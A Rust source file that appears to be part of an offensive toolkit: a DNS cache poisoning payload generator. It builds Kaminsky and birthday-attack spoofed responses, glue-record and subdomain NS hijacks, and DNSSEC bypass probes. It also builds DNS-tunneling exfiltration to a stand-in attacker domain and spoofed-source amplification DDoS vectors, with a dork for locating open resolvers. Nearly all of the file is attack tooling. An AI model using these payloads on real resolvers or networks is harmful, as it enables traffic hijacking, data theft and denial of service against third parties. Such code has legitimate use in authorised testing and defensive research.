use std::fmt;
use std::net::Ipv4Addr;

use rand::Rng;

/// DNS record types targeted by poisoning attacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum DnsRecordType {
    A,
    AAAA,
    CNAME,
    MX,
    NS,
    TXT,
    SOA,
    SRV,
    PTR,
    ANY,
}

impl fmt::Display for DnsRecordType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::A => write!(f, "A"),
            Self::AAAA => write!(f, "AAAA"),
            Self::CNAME => write!(f, "CNAME"),
            Self::MX => write!(f, "MX"),
            Self::NS => write!(f, "NS"),
            Self::TXT => write!(f, "TXT"),
            Self::SOA => write!(f, "SOA"),
            Self::SRV => write!(f, "SRV"),
            Self::PTR => write!(f, "PTR"),
            Self::ANY => write!(f, "ANY"),
        }
    }
}

/// Attack technique for DNS cache poisoning.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DnsPoisonTechnique {
    /// Classic Kaminsky race condition: flood spoofed responses with incremented TXIDs.
    KaminskyRace,
    /// Birthday attack: send queries and spoofed replies concurrently to exploit TXID collision.
    BirthdayAttack,
    /// Forge responses with glue records pointing NS to attacker-controlled IPs.
    GlueRecordInjection,
    /// Attempt zone transfer to enumerate records for targeted poisoning.
    ZoneTransferProbe,
    /// Bypass DNSSEC by targeting unsigned delegations or algorithm downgrade.
    DnssecBypass(DnssecBypassVariant),
    /// Use DNS tunneling to exfiltrate data through TXT/CNAME queries.
    DnsTunneling(DnsTunnelingMode),
    /// Amplification: open-resolver queries with spoofed source for reflected DDoS.
    Amplification(AmplificationType),
    /// Cache pre-loading: race legitimate TTL expiry to inject poisoned records.
    CachePreload,
    /// Subdomain delegation poisoning: inject NS records for subdomains.
    SubdomainDelegation,
}

/// DNSSEC bypass sub-variants.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnssecBypassVariant {
    /// Target zones with unsigned delegations (DS record absent).
    UnsignedDelegation,
    /// Attempt algorithm rollover confusion (RSASHA1 → weaker).
    AlgorithmDowngrade,
    /// Exploit validators that accept expired signatures.
    ExpiredSignature,
    /// Inject records into zones where NSEC/NSEC3 reveals zone contents.
    NsecWalking,
}

/// DNS tunneling exfiltration modes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsTunnelingMode {
    /// Encode data in subdomain labels (max 63 chars per label).
    SubdomainEncoding,
    /// Encode data in TXT record queries/responses.
    TxtRecordChannel,
    /// Use CNAME chains for bidirectional communication.
    CnameChain,
    /// Encode in NULL record type for raw binary.
    NullRecord,
}

/// DNS amplification vector types.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AmplificationType {
    /// ANY query to domains with many records (amplification factor ~28-54x).
    AnyQuery,
    /// DNSSEC-signed responses (amplification factor ~44-100x).
    DnssecSigned,
    /// EDNS0 with large buffer size advertisement.
    Edns0LargeBuffer,
    /// Recursive queries to open resolvers.
    OpenResolver,
}

/// A generated DNS poisoning payload ready for injection or testing.
#[derive(Debug, Clone, PartialEq)]
pub struct DnsPoisonPayload {
    pub technique: DnsPoisonTechnique,
    pub target_domain: String,
    pub record_type: DnsRecordType,
    pub spoofed_data: String,
    pub description: String,
    pub transaction_ids: Option<Vec<u16>>,
    pub ttl: u32,
    pub source_port: Option<u16>,
}

/// Kaminsky attack race parameters calculated from resolver properties.
#[derive(Debug, Clone)]
pub struct KaminskyParameters {
    pub txid_space: u32,
    pub source_port_randomized: bool,
    pub effective_entropy_bits: u32,
    pub packets_needed_50pct: u64,
    pub packets_needed_99pct: u64,
    pub estimated_seconds_at_1gbps: f64,
}

/// Birthday attack collision parameters.
#[derive(Debug, Clone)]
pub struct BirthdayParameters {
    pub txid_bits: u32,
    pub queries_for_50pct: u64,
    pub queries_for_99pct: u64,
    pub simultaneous_queries: u32,
    pub spoofed_responses_per_query: u32,
    pub collision_probability: f64,
}

/// Primary DNS cache poisoning payload generator.
#[derive(Debug)]
pub struct DnsPoisonGenerator {
    attacker_ip: Ipv4Addr,
    attacker_ns: String,
    tunnel_domain: String,
}

impl Default for DnsPoisonGenerator {
    fn default() -> Self {
        Self::new()
    }
}

impl DnsPoisonGenerator {
    pub fn new() -> Self {
        Self {
            attacker_ip: Ipv4Addr::new(10, 13, 37, 1),
            attacker_ns: "ns1.attacker.example".to_string(),
            tunnel_domain: "t.attacker.example".to_string(),
        }
    }

    pub fn with_attacker_ip(mut self, ip: Ipv4Addr) -> Self {
        self.attacker_ip = ip;
        self
    }

    pub fn with_attacker_ns(mut self, ns: String) -> Self {
        self.attacker_ns = ns;
        self
    }

    pub fn with_tunnel_domain(mut self, domain: String) -> Self {
        self.tunnel_domain = domain;
        self
    }

    /// Generate a Kaminsky race payload targeting a specific domain.
    pub fn kaminsky_race(&self, target_domain: &str) -> DnsPoisonPayload {
        let mut rng = rand::rng();
        let random_prefix: String = (0..8)
            .map(|_| rng.random_range(b'a'..=b'z') as char)
            .collect();
        let query_domain = format!("{random_prefix}.{target_domain}");
        let txids: Vec<u16> = (0..256).map(|_| rng.random()).collect();

        DnsPoisonPayload {
            technique: DnsPoisonTechnique::KaminskyRace,
            target_domain: query_domain,
            record_type: DnsRecordType::A,
            spoofed_data: format!(
                "ANSWER: {{}} -> {}\nAUTHORITY: {target_domain} NS {}\nADDITIONAL: {} A {}",
                self.attacker_ip, self.attacker_ns, self.attacker_ns, self.attacker_ip
            ),
            description: format!(
                "Kaminsky race: flood {} spoofed responses for random subdomain of {target_domain}, \
                 injecting glue record pointing NS to attacker",
                txids.len()
            ),
            transaction_ids: Some(txids),
            ttl: 86400,
            source_port: Some(53),
        }
    }

    /// Calculate Kaminsky attack feasibility parameters.
    pub fn kaminsky_parameters(&self, source_port_randomized: bool) -> KaminskyParameters {
        let txid_space: u32 = 65536;
        let effective_entropy_bits = if source_port_randomized { 16 + 16 } else { 16 };
        let space = 2u64.pow(effective_entropy_bits);
        let packets_50 = ((space as f64) * 0.693).ceil() as u64;
        let packets_99 = ((space as f64) * 4.605).ceil() as u64;
        let bytes_per_packet = 512u64;
        let bits_per_sec = 1_000_000_000u64;
        let estimated_seconds = (packets_99 * bytes_per_packet * 8) as f64 / bits_per_sec as f64;

        KaminskyParameters {
            txid_space,
            source_port_randomized,
            effective_entropy_bits,
            packets_needed_50pct: packets_50,
            packets_needed_99pct: packets_99,
            estimated_seconds_at_1gbps: estimated_seconds,
        }
    }

    /// Generate birthday attack collision parameters.
    pub fn birthday_parameters(
        &self,
        simultaneous_queries: u32,
        responses_per_query: u32,
    ) -> BirthdayParameters {
        let txid_bits: u32 = 16;
        let n = 2u64.pow(txid_bits);
        let q = simultaneous_queries as u64;
        let r = responses_per_query as u64;
        let attempts = q * r;
        let collision_prob =
            1.0 - (-(attempts as f64 * (attempts as f64 - 1.0)) / (2.0 * n as f64)).exp();
        let queries_50 = (1.177 * (n as f64).sqrt()).ceil() as u64;
        let queries_99 = (3.035 * (n as f64).sqrt()).ceil() as u64;

        BirthdayParameters {
            txid_bits,
            queries_for_50pct: queries_50,
            queries_for_99pct: queries_99,
            simultaneous_queries,
            spoofed_responses_per_query: responses_per_query,
            collision_probability: collision_prob.min(1.0),
        }
    }

    /// Generate birthday attack payload.
    pub fn birthday_attack(&self, target_domain: &str) -> DnsPoisonPayload {
        let mut rng = rand::rng();
        let txids: Vec<u16> = (0..1024).map(|_| rng.random()).collect();
        let params = self.birthday_parameters(300, 300);

        DnsPoisonPayload {
            technique: DnsPoisonTechnique::BirthdayAttack,
            target_domain: target_domain.to_string(),
            record_type: DnsRecordType::A,
            spoofed_data: format!(
                "Flood {} simultaneous queries + {} spoofed responses\n\
                 P(collision) ≈ {:.4}\n\
                 ANSWER: {target_domain} A {}",
                params.simultaneous_queries,
                params.spoofed_responses_per_query,
                params.collision_probability,
                self.attacker_ip,
            ),
            description: format!(
                "Birthday attack against {target_domain}: {} queries × {} responses, \
                 exploiting TXID birthday paradox",
                params.simultaneous_queries, params.spoofed_responses_per_query
            ),
            transaction_ids: Some(txids),
            ttl: 3600,
            source_port: None,
        }
    }

    /// Generate glue record injection payload.
    pub fn glue_record_injection(&self, target_domain: &str) -> DnsPoisonPayload {
        DnsPoisonPayload {
            technique: DnsPoisonTechnique::GlueRecordInjection,
            target_domain: target_domain.to_string(),
            record_type: DnsRecordType::NS,
            spoofed_data: format!(
                "AUTHORITY: {target_domain} IN NS {}\n\
                 ADDITIONAL: {} IN A {}",
                self.attacker_ns, self.attacker_ns, self.attacker_ip
            ),
            description: format!(
                "Inject glue record: delegate {target_domain} to {} ({})",
                self.attacker_ns, self.attacker_ip
            ),
            transaction_ids: None,
            ttl: 86400,
            source_port: Some(53),
        }
    }

    /// Generate zone transfer probe (AXFR).
    pub fn zone_transfer_probe(&self, target_domain: &str, ns_server: &str) -> DnsPoisonPayload {
        DnsPoisonPayload {
            technique: DnsPoisonTechnique::ZoneTransferProbe,
            target_domain: target_domain.to_string(),
            record_type: DnsRecordType::SOA,
            spoofed_data: format!(
                "AXFR {target_domain} @{ns_server}\n\
                 dig axfr {target_domain} @{ns_server}\n\
                 host -t axfr {target_domain} {ns_server}"
            ),
            description: format!("Zone transfer probe against {ns_server} for {target_domain}"),
            transaction_ids: None,
            ttl: 0,
            source_port: None,
        }
    }

    /// Generate DNSSEC bypass payloads.
    pub fn dnssec_bypass(
        &self,
        target_domain: &str,
        variant: DnssecBypassVariant,
    ) -> DnsPoisonPayload {
        let (spoofed_data, description) = match variant {
            DnssecBypassVariant::UnsignedDelegation => (
                format!(
                    "Query for DS record at parent: dig DS {target_domain}\n\
                     If NODATA/NXDOMAIN → delegation unsigned → poison freely\n\
                     Inject: {target_domain} NS {}\n\
                     Glue: {} A {}",
                    self.attacker_ns, self.attacker_ns, self.attacker_ip
                ),
                format!("DNSSEC bypass via unsigned delegation check on {target_domain}"),
            ),
            DnssecBypassVariant::AlgorithmDowngrade => (
                format!(
                    "Probe DNSKEY algorithms: dig DNSKEY {target_domain} +dnssec\n\
                     If RSASHA1 (algo 5) present → collision feasible\n\
                     If algo 7 (RSASHA1-NSEC3-SHA1) → same weakness\n\
                     Forge RRSIG with chosen-prefix collision"
                ),
                format!("DNSSEC algorithm downgrade probe on {target_domain}"),
            ),
            DnssecBypassVariant::ExpiredSignature => (
                format!(
                    "Check signature expiry: dig RRSIG {target_domain} +dnssec\n\
                     If inception > now or expiry < now → signature invalid\n\
                     Some validators continue serving expired → inject poisoned records\n\
                     Inject: {target_domain} A {}",
                    self.attacker_ip
                ),
                format!("DNSSEC expired signature exploitation on {target_domain}"),
            ),
            DnssecBypassVariant::NsecWalking => (
                format!(
                    "Enumerate zone via NSEC walking:\n\
                     dig NSEC {target_domain} → next_name\n\
                     dig NSEC {{next_name}} → next_next_name\n\
                     Repeat until wrap-around to {target_domain}\n\
                     NSEC3: attempt rainbow table against salt+iterations"
                ),
                format!("NSEC/NSEC3 zone enumeration on {target_domain}"),
            ),
        };

        DnsPoisonPayload {
            technique: DnsPoisonTechnique::DnssecBypass(variant),
            target_domain: target_domain.to_string(),
            record_type: DnsRecordType::ANY,
            spoofed_data,
            description,
            transaction_ids: None,
            ttl: 3600,
            source_port: None,
        }
    }

    /// Generate DNS tunneling payload for data exfiltration.
    pub fn dns_tunnel(&self, data: &[u8], mode: DnsTunnelingMode) -> DnsPoisonPayload {
        let encoded = encode_tunnel_data(data, mode);
        let (spoofed_data, description) = match mode {
            DnsTunnelingMode::SubdomainEncoding => (
                format!(
                    "Encoded {} bytes → {} chunks as subdomain labels\n\
                     Queries: {}.{}\n\
                     Max label: 63 chars, base32 encoded",
                    data.len(),
                    encoded.len(),
                    encoded.first().unwrap_or(&String::new()),
                    self.tunnel_domain
                ),
                format!(
                    "DNS tunnel (subdomain): {} bytes via {}.{}",
                    data.len(),
                    encoded.len(),
                    self.tunnel_domain
                ),
            ),
            DnsTunnelingMode::TxtRecordChannel => (
                format!(
                    "Encoded {} bytes → {} TXT queries\n\
                     Query: TXT {{}}.{}\n\
                     Response: TXT \"{{base64_chunk}}\"",
                    data.len(),
                    encoded.len(),
                    self.tunnel_domain
                ),
                format!(
                    "DNS tunnel (TXT): {} bytes in {} queries via {}",
                    data.len(),
                    encoded.len(),
                    self.tunnel_domain
                ),
            ),
            DnsTunnelingMode::CnameChain => (
                format!(
                    "Encoded {} bytes → {} CNAME hops\n\
                     {{seq}}.cmd.{} CNAME {{seq}}.resp.{}\n\
                     Bidirectional: query=upstream, response=downstream",
                    data.len(),
                    encoded.len(),
                    self.tunnel_domain,
                    self.tunnel_domain
                ),
                format!(
                    "DNS tunnel (CNAME chain): {} bytes bidirectional via {}",
                    data.len(),
                    self.tunnel_domain
                ),
            ),
            DnsTunnelingMode::NullRecord => (
                format!(
                    "Encoded {} bytes → {} NULL record queries\n\
                     Query: NULL {{}}.{}\n\
                     Raw binary in RDATA (type 10)",
                    data.len(),
                    encoded.len(),
                    self.tunnel_domain
                ),
                format!(
                    "DNS tunnel (NULL): {} raw bytes via {}",
                    data.len(),
                    self.tunnel_domain
                ),
            ),
        };

        DnsPoisonPayload {
            technique: DnsPoisonTechnique::DnsTunneling(mode),
            target_domain: self.tunnel_domain.clone(),
            record_type: match mode {
                DnsTunnelingMode::SubdomainEncoding => DnsRecordType::A,
                DnsTunnelingMode::TxtRecordChannel => DnsRecordType::TXT,
                DnsTunnelingMode::CnameChain => DnsRecordType::CNAME,
                DnsTunnelingMode::NullRecord => DnsRecordType::ANY,
            },
            spoofed_data,
            description,
            transaction_ids: None,
            ttl: 0,
            source_port: None,
        }
    }

    /// Generate DNS amplification vector payload.
    pub fn amplification(
        &self,
        target_ip: Ipv4Addr,
        amp_type: AmplificationType,
    ) -> DnsPoisonPayload {
        let (domain, record_type, factor, spoofed_data) = match amp_type {
            AmplificationType::AnyQuery => (
                "isc.org".to_string(),
                DnsRecordType::ANY,
                "28-54x",
                format!(
                    "Spoofed-source: {target_ip}\n\
                     Query: ANY isc.org (small query → large response)\n\
                     Amplification: ~28-54x\n\
                     Open resolvers: shodan dork 'port:53 recursion:enabled'"
                ),
            ),
            AmplificationType::DnssecSigned => (
                "gov".to_string(),
                DnsRecordType::ANY,
                "44-100x",
                format!(
                    "Spoofed-source: {target_ip}\n\
                     Query: ANY gov +dnssec (RRSIG bloat)\n\
                     Amplification: ~44-100x\n\
                     EDNS0 buffer: 4096"
                ),
            ),
            AmplificationType::Edns0LargeBuffer => (
                "cloudflare.com".to_string(),
                DnsRecordType::ANY,
                "70x+",
                format!(
                    "Spoofed-source: {target_ip}\n\
                     OPT EDNS0 UDP payload size: 4096\n\
                     Query: ANY + EDNS0 → response up to 4096 bytes\n\
                     Amplification: ~70x+"
                ),
            ),
            AmplificationType::OpenResolver => (
                "sl".to_string(),
                DnsRecordType::ANY,
                "~50x",
                format!(
                    "Spoofed-source: {target_ip}\n\
                     Recursive query to open resolver\n\
                     Query: ANY sl (largest TLD zone)\n\
                     Chain: open_resolver → authoritative → victim\n\
                     Amplification: ~50x"
                ),
            ),
        };

        DnsPoisonPayload {
            technique: DnsPoisonTechnique::Amplification(amp_type),
            target_domain: domain,
            record_type,
            spoofed_data,
            description: format!("DNS amplification ({factor}) targeting {target_ip}"),
            transaction_ids: None,
            ttl: 0,
            source_port: Some(53),
        }
    }

    /// Generate cache preload race payload.
    pub fn cache_preload(&self, target_domain: &str, current_ttl_secs: u32) -> DnsPoisonPayload {
        DnsPoisonPayload {
            technique: DnsPoisonTechnique::CachePreload,
            target_domain: target_domain.to_string(),
            record_type: DnsRecordType::A,
            spoofed_data: format!(
                "Wait for TTL expiry (~{current_ttl_secs}s remaining)\n\
                 Race window: immediately after expiry\n\
                 Spoofed response: {target_domain} A {} TTL 86400\n\
                 Flood spoofed replies during resolver re-query",
                self.attacker_ip
            ),
            description: format!(
                "Cache preload race: poison {target_domain} when TTL expires in {current_ttl_secs}s"
            ),
            transaction_ids: None,
            ttl: 86400,
            source_port: Some(53),
        }
    }

    /// Generate subdomain delegation poisoning payload.
    pub fn subdomain_delegation(&self, parent_domain: &str, subdomain: &str) -> DnsPoisonPayload {
        let fqdn = format!("{subdomain}.{parent_domain}");
        DnsPoisonPayload {
            technique: DnsPoisonTechnique::SubdomainDelegation,
            target_domain: fqdn.clone(),
            record_type: DnsRecordType::NS,
            spoofed_data: format!(
                "AUTHORITY: {fqdn} IN NS {}\n\
                 ADDITIONAL: {} IN A {}\n\
                 Parent query triggers cached delegation → all {fqdn} queries go to attacker",
                self.attacker_ns, self.attacker_ns, self.attacker_ip
            ),
            description: format!("Subdomain delegation poisoning: hijack {fqdn} via NS injection"),
            transaction_ids: None,
            ttl: 86400,
            source_port: Some(53),
        }
    }

    /// Generate a comprehensive set of payloads for a target domain.
    pub fn generate_full_suite(&self, target_domain: &str) -> Vec<DnsPoisonPayload> {
        let mut payloads = Vec::new();

        payloads.push(self.kaminsky_race(target_domain));
        payloads.push(self.birthday_attack(target_domain));
        payloads.push(self.glue_record_injection(target_domain));
        payloads.push(self.zone_transfer_probe(target_domain, &format!("ns1.{target_domain}")));
        payloads.push(self.cache_preload(target_domain, 300));
        payloads.push(self.subdomain_delegation(target_domain, "admin"));

        for variant in &[
            DnssecBypassVariant::UnsignedDelegation,
            DnssecBypassVariant::AlgorithmDowngrade,
            DnssecBypassVariant::ExpiredSignature,
            DnssecBypassVariant::NsecWalking,
        ] {
            payloads.push(self.dnssec_bypass(target_domain, *variant));
        }

        for mode in &[
            DnsTunnelingMode::SubdomainEncoding,
            DnsTunnelingMode::TxtRecordChannel,
            DnsTunnelingMode::CnameChain,
            DnsTunnelingMode::NullRecord,
        ] {
            payloads.push(self.dns_tunnel(b"EXFILTRATE_TEST_DATA", *mode));
        }

        let victim = Ipv4Addr::new(198, 51, 100, 1);
        for amp_type in &[
            AmplificationType::AnyQuery,
            AmplificationType::DnssecSigned,
            AmplificationType::Edns0LargeBuffer,
            AmplificationType::OpenResolver,
        ] {
            payloads.push(self.amplification(victim, *amp_type));
        }

        payloads
    }
}

/// Encode raw bytes for DNS tunneling (base32-like, label-safe).
fn encode_tunnel_data(data: &[u8], mode: DnsTunnelingMode) -> Vec<String> {
    let chunk_size = match mode {
        DnsTunnelingMode::SubdomainEncoding => 30,
        DnsTunnelingMode::TxtRecordChannel => 189,
        DnsTunnelingMode::CnameChain => 30,
        DnsTunnelingMode::NullRecord => 255,
    };

    data.chunks(chunk_size)
        .enumerate()
        .map(|(i, chunk)| {
            let hex: String = chunk.iter().map(|b| format!("{b:02x}")).collect();
            format!("{i:04x}{hex}")
        })
        .collect()
}
